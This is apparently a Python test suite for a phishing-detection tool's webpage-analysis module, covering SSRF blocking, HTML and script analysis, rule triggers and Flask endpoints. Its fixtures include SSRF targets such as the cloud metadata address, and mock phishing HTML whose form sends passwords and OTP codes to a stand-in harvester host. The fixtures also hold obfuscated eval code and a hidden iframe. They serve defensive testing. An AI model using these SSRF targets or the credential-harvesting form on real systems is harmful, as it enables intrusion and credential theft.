"""
NEURASHIELD — Comprehensive Test Suite for MODULE 3 (Webpage Intelligence)
Tests:
1. SSRF Protection & Private IP Blocking
2. Safe Webpage Fetcher
3. Webpage Analyzer (HTML/DOM, Forms, Scripts, Iframes, Resources, Security Headers, Content)
4. Webpage Rule Engine (WEB-001 through WEB-012)
5. Multi-Layer Risk Fusion (Module 1 + Module 2 + Module 3)
6. Flask Endpoints (/webpage-intelligence, /api/webpage/investigate)
7. Regression Testing for Module 1 and Module 2
"""

import sys
import os
import unittest
import json

# Ensure project root is in path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__)))
sys.path.insert(0, project_root)

from model.webpage_intelligence.fetcher import (
    _is_ip_blocked, _validate_hostname, safe_fetch_webpage,
    FETCH_SUCCESS, SSRF_BLOCKED, INVALID_URL
)
from model.webpage_intelligence.analyzer import analyze_webpage
from model.webpage_intelligence.webpage_rule_engine import evaluate_webpage_rules
from model.domain_intelligence.risk_fusion import fuse_threat_layers, calculate_risk_level
from model.feature_extraction import extract_features, normalize_url
from backend.app import app, classify_url


class TestModule3WebpageIntelligence(unittest.TestCase):

    def setUp(self):
        self.app = app.test_client()
        self.app.testing = True

    # ──────────────────────────────────────────────────────────────────────────
    # 1. SSRF Protection & Hostname Validation
    # ──────────────────────────────────────────────────────────────────────────
    def test_01_ssrf_ip_blocking(self):
        """Verify private, loopback, and reserved IP ranges are blocked."""
        # Loopback
        self.assertTrue(_is_ip_blocked("127.0.0.1"))
        self.assertTrue(_is_ip_blocked("127.0.1.1"))
        # RFC1918 Private
        self.assertTrue(_is_ip_blocked("10.0.0.1"))
        self.assertTrue(_is_ip_blocked("10.254.254.254"))
        self.assertTrue(_is_ip_blocked("192.168.1.1"))
        self.assertTrue(_is_ip_blocked("172.16.0.1"))
        self.assertTrue(_is_ip_blocked("172.31.255.255"))
        # Cloud metadata
        self.assertTrue(_is_ip_blocked("169.254.169.254"))
        # Public IP should NOT be blocked
        self.assertFalse(_is_ip_blocked("8.8.8.8"))
        self.assertFalse(_is_ip_blocked("1.1.1.1"))
        self.assertFalse(_is_ip_blocked("142.250.190.46"))

    def test_02_ssrf_hostname_validation(self):
        """Verify cloud metadata hostnames and localhost are blocked."""
        safe, reason = _validate_hostname("localhost")
        self.assertFalse(safe)
        self.assertIn("blocked", reason.lower())

        safe, reason = _validate_hostname("metadata.google.internal")
        self.assertFalse(safe)

        safe, reason = _validate_hostname("169.254.169.254")
        self.assertFalse(safe)

        safe, _ = _validate_hostname("google.com")
        self.assertTrue(safe)

    def test_03_safe_fetch_ssrf_enforcement(self):
        """Verify safe_fetch_webpage blocks SSRF targets immediately without making outbound requests."""
        res1 = safe_fetch_webpage("http://127.0.0.1:8080/admin")
        self.assertEqual(res1["fetch_status"], SSRF_BLOCKED)

        res2 = safe_fetch_webpage("http://169.254.169.254/latest/meta-data/")
        self.assertEqual(res2["fetch_status"], SSRF_BLOCKED)

        res3 = safe_fetch_webpage("http://localhost/secret")
        self.assertEqual(res3["fetch_status"], SSRF_BLOCKED)

        res4 = safe_fetch_webpage("not_a_valid_url")
        self.assertIn(res4["fetch_status"], [INVALID_URL, "DNS_FAILURE"])

    # ──────────────────────────────────────────────────────────────────────────
    # 2. Webpage HTML / DOM / Form / Script Analyzer
    # ──────────────────────────────────────────────────────────────────────────
    def test_04_analyzer_form_and_credential_detection(self):
        """Verify detector finds password forms, sensitive fields, and cross-domain action."""
        phishing_html = """
        <!DOCTYPE html>
        <html>
        <head><title>Account Verification Required</title></head>
        <body>
          <h1>Security Alert: Urgent Verification</h1>
          <p>Your account will be suspended immediately if not confirmed.</p>
          <form action="http://malicious-credential-harvester.com/steal.php" method="POST">
            <label>Email Address</label>
            <input type="email" name="user_email" />
            <label>Password</label>
            <input type="password" name="user_password" />
            <label>One-Time Verification Code (OTP)</label>
            <input type="text" name="otp_token" />
            <input type="hidden" name="stealth_id" value="xyz99" />
            <button type="submit">Verify Now</button>
          </form>
        </body>
        </html>
        """
        mock_fetch = {
            "fetch_status": FETCH_SUCCESS,
            "http_status": 200,
            "html": phishing_html,
            "final_url": "https://secure-login-paypal.com/signin",
            "headers": {
                "server": "Apache/2.4",
                "content-type": "text/html; charset=utf-8"
            }
        }

        analysis = analyze_webpage(mock_fetch)
        form_analysis = analysis.get("form_analysis", {})

        self.assertEqual(form_analysis.get("form_count"), 1)
        self.assertTrue(form_analysis.get("has_password_field"))
        self.assertTrue(form_analysis.get("has_email_field"))
        self.assertTrue(form_analysis.get("has_otp_field"))
        self.assertTrue(form_analysis.get("has_cross_domain_action"))
        self.assertIn("malicious-credential-harvester.com", form_analysis.get("forms", [{}])[0].get("action_domain", ""))

    def test_05_analyzer_javascript_and_iframe_detection(self):
        """Verify detector catches suspicious script patterns (eval, base64, location) and hidden iframes."""
        suspicious_html = """
        <!DOCTYPE html>
        <html>
        <head>
          <title>Portal</title>
          <script src="https://cdn.external-third-party.org/tracker.js"></script>
        </head>
        <body>
          <script>
            eval(atob("YWxlcnQoJ2xvZ2luJyk7"));
            document.write('<p>Injected</p>');
            window.location.href = "https://redirect-attacker.com";
          </script>
          <iframe src="https://stealth-phish.net/embed" style="display:none; width:0; height:0;" width="0" height="0"></iframe>
        </body>
        </html>
        """
        mock_fetch = {
            "fetch_status": FETCH_SUCCESS,
            "http_status": 200,
            "html": suspicious_html,
            "final_url": "https://portal-check.com",
            "headers": {}
        }

        analysis = analyze_webpage(mock_fetch)
        script_analysis = analysis.get("script_analysis", {})
        iframe_analysis = analysis.get("iframe_analysis", {})

        self.assertTrue(script_analysis.get("has_suspicious_patterns"))
        patterns = script_analysis.get("suspicious_patterns", [])
        self.assertTrue(any("eval" in str(p) or "base64" in str(p) or "location" in str(p) for p in patterns))
        self.assertIn("external-third-party.org", script_analysis.get("external_script_domains", []))

        self.assertEqual(iframe_analysis.get("total_count"), 1)
        self.assertTrue(iframe_analysis.get("has_hidden_iframes"))
        self.assertTrue(iframe_analysis.get("has_cross_domain_iframes"))

    def test_06_analyzer_security_headers(self):
        """Verify analyzer audits security headers like HSTS, CSP, X-Frame-Options."""
        mock_fetch_no_headers = {
            "fetch_status": FETCH_SUCCESS,
            "http_status": 200,
            "html": "<html><body>Hello</body></html>",
            "final_url": "https://unprotected-site.com",
            "headers": {
                "server": "nginx"
            }
        }
        analysis = analyze_webpage(mock_fetch_no_headers)
        hdr_analysis = analysis.get("header_analysis", {})
        self.assertEqual(hdr_analysis.get("present_count"), 0)
        self.assertFalse(hdr_analysis.get("has_csp"))
        self.assertFalse(hdr_analysis.get("has_hsts"))

        # Test with complete headers
        mock_fetch_good_headers = {
            "fetch_status": FETCH_SUCCESS,
            "http_status": 200,
            "html": "<html><body>Hello</body></html>",
            "final_url": "https://protected-site.com",
            "headers": {
                "strict-transport-security": "max-age=31536000; includeSubDomains",
                "content-security-policy": "default-src 'self'",
                "x-frame-options": "DENY",
                "x-content-type-options": "nosniff",
                "referrer-policy": "strict-origin-when-cross-origin",
                "permissions-policy": "geolocation=()"
            }
        }
        analysis_good = analyze_webpage(mock_fetch_good_headers)
        hdr_good = analysis_good.get("header_analysis", {})
        self.assertEqual(hdr_good.get("present_count"), 6)
        self.assertTrue(hdr_good.get("has_csp"))
        self.assertTrue(hdr_good.get("has_hsts"))

    # ──────────────────────────────────────────────────────────────────────────
    # 3. Webpage Security Rule Engine (12 Rules)
    # ──────────────────────────────────────────────────────────────────────────
    def test_07_webpage_rule_engine_triggers(self):
        """Verify WEB-001, WEB-002, WEB-003, WEB-007, WEB-008 rules trigger on phishing artifacts."""
        phish_analysis = {
            "form_analysis": {
                "has_password_field": True,
                "has_cross_domain_action": True,
                "credential_field_count": 2,
                "form_count": 1,
                "forms": [{
                    "has_password": True,
                    "is_cross_domain": True,
                    "action_domain": "attacker-dropzone.ru",
                    "action": "https://attacker-dropzone.ru/log.php"
                }]
            },
            "script_analysis": {
                "has_suspicious_patterns": True,
                "suspicious_patterns": ["eval_usage", "base64_pattern"],
                "total_count": 3
            },
            "iframe_analysis": {
                "total_count": 1,
                "has_hidden_iframes": True,
                "has_cross_domain_iframes": True,
                "iframes": [{"is_hidden": True, "is_cross_domain": True, "domain": "hidden-tracker.biz"}]
            },
            "resource_analysis": {
                "external_domain_count": 8,
                "external_resources": 15,
                "internal_resources": 1
            },
            "header_analysis": {
                "present_count": 0,
                "coverage_percent": 0
            },
            "content_analysis": {
                "urgency_matches_count": 3,
                "has_urgency_language": True,
                "targeted_brands": ["PayPal"]
            },
            "html_analysis": {
                "title": "PayPal - Urgent Account Verification"
            }
        }

        mock_fetch = {
            "fetch_status": FETCH_SUCCESS,
            "http_status": 200,
            "final_url": "https://login-paypal-verify.tk/auth",
            "redirect_analysis": {"count": 3, "has_cross_domain_redirect": True}
        }

        rules_result = evaluate_webpage_rules(phish_analysis, mock_fetch, "https://login-paypal-verify.tk/auth")
        hit_ids = [r["rule_id"] for r in rules_result.get("rules_hit", [])]

        self.assertIn("WEB-001", hit_ids)  # Password collection
        self.assertIn("WEB-002", hit_ids)  # Cross-domain password submission
        self.assertIn("WEB-007", hit_ids)  # Suspicious iframe
        self.assertIn("WEB-008", hit_ids)  # Obfuscated / suspicious JS
        self.assertIn("WEB-011", hit_ids)  # Urgent language
        self.assertGreaterEqual(rules_result.get("risk_score", 0), 60)

    # ──────────────────────────────────────────────────────────────────────────
    # 4. Multi-Layer Risk Fusion (Module 1 + Module 2 + Module 3)
    # ──────────────────────────────────────────────────────────────────────────
    def test_08_risk_fusion_three_modules_active(self):
        """Verify risk fusion correctly integrates Webpage Intelligence at 30% weight."""
        dummy_url_intel = {
            "structural": {"risk_score": 40},
            "lexical": {"risk_score": 50},
            "security_rules": {"risk_score": 60},
            "ml_classifier": {"risk_score": 45}
        }
        dummy_domain_intel = {
            "overall_status": "success",
            "domain": "test-domain.com"
        }
        dummy_domain_rules = {"risk_score": 55}
        dummy_domain_ml = {"status": "success", "risk_score": 60}
        dummy_webpage_rules = {
            "triggered": True,
            "risk_score": 85
        }

        fusion = fuse_threat_layers(
            url_intelligence=dummy_url_intel,
            domain_intelligence=dummy_domain_intel,
            domain_rules=dummy_domain_rules,
            domain_ml=dummy_domain_ml,
            webpage_rules=dummy_webpage_rules
        )

        self.assertEqual(fusion["active_layers_count"], 6)
        self.assertIn("Webpage Intelligence", [l["name"] for l in fusion["layers"]])
        wp_layer = next(l for l in fusion["layers"] if l["name"] == "Webpage Intelligence")
        self.assertEqual(wp_layer["weight"], 0.30)
        self.assertEqual(wp_layer["module"], "Module 3")
        self.assertIn("Webpage Intelligence (30%)", fusion["explanation"])
        self.assertGreaterEqual(fusion["composite"], 50)

    # ──────────────────────────────────────────────────────────────────────────
    # 5. Flask Endpoints Integration
    # ──────────────────────────────────────────────────────────────────────────
    def test_09_webpage_intelligence_page_route(self):
        """Verify GET /webpage-intelligence returns 200 and serves HTML."""
        response = self.app.get("/webpage-intelligence")
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Webpage Content & DOM Intelligence", response.data)
        self.assertIn(b"MODULE 3 ACTIVE", response.data)

    def test_10_api_webpage_investigate_validation(self):
        """Verify POST /api/webpage/investigate validates input and blocks SSRF."""
        # Empty input
        r1 = self.app.post("/api/webpage/investigate", json={})
        self.assertEqual(r1.status_code, 400)

        # SSRF Target
        r2 = self.app.post("/api/webpage/investigate", json={"url": "http://127.0.0.1:8080/admin"})
        self.assertEqual(r2.status_code, 200)
        data2 = json.loads(r2.data)
        self.assertEqual(data2.get("fetch_status"), SSRF_BLOCKED)
        self.assertIn("investigation_id", data2)
        self.assertIn("threat_dna", data2)

    def test_11_api_webpage_investigate_live_safe_fetch(self):
        """Verify POST /api/webpage/investigate successfully processes a public domain."""
        r = self.app.post("/api/webpage/investigate", json={"url": "https://example.com"})
        self.assertEqual(r.status_code, 200)
        data = json.loads(r.data)
        self.assertIn("investigation_id", data)
        self.assertIn("webpage_analysis", data)
        self.assertIn("webpage_rules", data)
        self.assertIn("risk_fusion", data)
        self.assertIn("what_found", data)
        self.assertIn("what_not_verified", data)

    # ──────────────────────────────────────────────────────────────────────────
    # 6. Regression Verification: Module 1 & Module 2
    # ──────────────────────────────────────────────────────────────────────────
    def test_12_regression_module1_url_intelligence(self):
        """Verify Module 1 URL intelligence still extracts features and classifies."""
        pred, prob = classify_url("https://paypal-update-account.com/security")
        self.assertIn(pred, ["Phishing", "Legitimate", "Suspicious"])
        feats = extract_features("https://paypal-update-account.com/security")
        self.assertIn("url_length", feats)
        self.assertIn("domain_entropy", feats)

    def test_13_regression_module2_domain_intelligence(self):
        """Verify Module 2 /domain-intelligence route and /api/domain/analyze still function."""
        resp = self.app.get("/domain-intelligence")
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"Domain Intelligence", resp.data)

        # API call with localhost should be blocked by SSRF
        r_ssrf = self.app.post("/api/domain/analyze", json={"domain": "127.0.0.1"})
        self.assertIn(r_ssrf.status_code, [400, 403])

    # ──────────────────────────────────────────────────────────────────────────
    # 7. CRITICAL WEBPAGE EXISTENCE FIX TESTS
    # ──────────────────────────────────────────────────────────────────────────
    def test_14_webpage_existence_strict_content_requirement(self):
        """Verify Webpage Intelligence MUST NOT generate analysis if fetch failed."""
        # Simulated failed fetch results
        failures = [
            {"fetch_status": "DNS_FAILURE", "fetch_status_detail": "DNS resolution failed", "html_content": None},
            {"fetch_status": "CONNECTION_TIMEOUT", "fetch_status_detail": "Connection timed out", "html_content": ""},
            {"fetch_status": "CONNECTION_REFUSED", "fetch_status_detail": "Connection refused", "html_content": ""},
            {"fetch_status": "HTTP_ERROR", "fetch_status_detail": "HTTP 404 Not Found", "html_content": ""},
            {"fetch_status": "UNSUPPORTED_CONTENT", "fetch_status_detail": "Unsupported content type", "html_content": ""},
        ]

        for mock_fetch in failures:
            res = analyze_webpage(mock_fetch)
            self.assertEqual(res["webpage_status"], "UNAVAILABLE")
            self.assertEqual(res["status"], "UNAVAILABLE")
            self.assertEqual(res["reason"], mock_fetch["fetch_status"])
            self.assertIn("Webpage could not be retrieved", res["message"])
            # ZERO fabricated analysis
            self.assertIsNone(res["html_analysis"])
            self.assertIsNone(res["form_analysis"])
            self.assertIsNone(res["script_analysis"])
            self.assertIsNone(res["iframe_analysis"])
            self.assertIsNone(res["resource_analysis"])
            self.assertIsNone(res["header_analysis"])
            self.assertIsNone(res["content_analysis"])

            # Rule engine evaluation MUST be 0 and clean
            rules_eval = evaluate_webpage_rules(res, mock_fetch)
            self.assertEqual(rules_eval["webpage_status"], "UNAVAILABLE")
            self.assertEqual(rules_eval["rule_count"], 0)
            self.assertEqual(rules_eval["webpage_risk_score"], 0)
            self.assertEqual(len(rules_eval["evidence"]), 0)

    def test_15_webpage_unavailable_risk_fusion_reduced_coverage(self):
        """Verify Webpage Intelligence unavailable state is NOT converted into phishing and has Reduced coverage."""
        dummy_url_intel = {
            "structural": {"risk_score": 10},
            "lexical": {"risk_score": 15},
            "security_rules": {"risk_score": 0},
            "ml_classifier": {"risk_score": 10}
        }
        dummy_domain_intel = {
            "overall_status": "success",
            "domain": "benign-site.org"
        }
        dummy_domain_rules = {"risk_score": 10}
        dummy_domain_ml = {"status": "success", "risk_score": 10}
        unavailable_webpage_rules = {
            "status": "UNAVAILABLE",
            "webpage_status": "UNAVAILABLE",
            "reason": "CONNECTION_TIMEOUT",
            "risk_score": 0
        }

        fusion = fuse_threat_layers(
            url_intelligence=dummy_url_intel,
            domain_intelligence=dummy_domain_intel,
            domain_rules=dummy_domain_rules,
            domain_ml=dummy_domain_ml,
            webpage_rules=unavailable_webpage_rules
        )

        # 5 active layers (webpage layer weight is 0.0)
        self.assertEqual(fusion["active_layers_count"], 5)
        wp_layer = next(l for l in fusion["layers"] if l["name"] == "Webpage Intelligence")
        self.assertEqual(wp_layer["weight"], 0.0)
        self.assertEqual(wp_layer["status"], "UNAVAILABLE")
        self.assertEqual(wp_layer["coverage"], "Reduced")
        self.assertEqual(wp_layer["reason"], "CONNECTION_TIMEOUT")
        # Composite score must NOT be inflated into a phishing verdict
        self.assertLess(fusion["composite"], 30)
        self.assertEqual(fusion["composite_level"], "LOW")

    def test_16_api_webpage_investigate_dns_failure_returns_unavailable(self):
        """Verify POST /api/webpage/investigate returns WEBPAGE STATUS: UNAVAILABLE for non-existent domain."""
        non_existent_url = "https://thisdomainwillneverexist123456789xyz.org"
        resp = self.app.post("/api/webpage/investigate", json={"url": non_existent_url})
        self.assertEqual(resp.status_code, 200)
        data = json.loads(resp.data)

        self.assertEqual(data.get("webpage_status"), "UNAVAILABLE")
        self.assertIn(data.get("webpage_reason"), ["DNS_FAILURE", "NETWORK_ERROR"])
        self.assertIn("Webpage could not be retrieved", data.get("webpage_message", ""))
        self.assertEqual(data.get("evidence_coverage_label"), "Reduced")
        # Ensure no fabricated form or script data
        wp_analysis = data.get("webpage_analysis", {})
        self.assertIsNone(wp_analysis.get("form_analysis"))
        self.assertIsNone(wp_analysis.get("script_analysis"))
        self.assertIsNone(wp_analysis.get("html_analysis"))


if __name__ == "__main__":
    print("=" * 65)
    print("RUNNING NEURASHIELD MODULE 3 TEST SUITE")
    print("=" * 65)
    unittest.main(verbosity=2)
